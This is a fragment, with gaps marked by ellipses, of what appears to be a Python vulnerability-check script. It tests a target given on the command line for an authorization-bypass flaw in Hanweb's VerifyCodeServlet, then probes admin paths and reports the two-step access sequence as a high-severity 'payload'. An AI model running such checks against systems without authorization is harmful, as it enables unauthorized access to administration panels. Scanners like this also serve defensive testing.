...
class hanweb_VerifyCodeServlet_install:
                ...
                if req.status_code==200:
                    for adminpath in adminpaths:
                        ...
                        if req2.status_code == 200 and ('Licence' in req2.text or 'admin' in req2.text):
                            printGreen("[+]Success:存在大汉VerfiyCodeServlet越权漏洞...(高危)\tpayload: "+"1.先访问"+vulnurl+"\t2.再访问"+adminurl)
                            sys.exit(1)
            printBlue("[-]Info:不存在hanweb_VerifyCodeServlet_install漏洞")
        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hanweb_VerifyCodeServlet_install(sys.argv[1])
    testVuln.run()
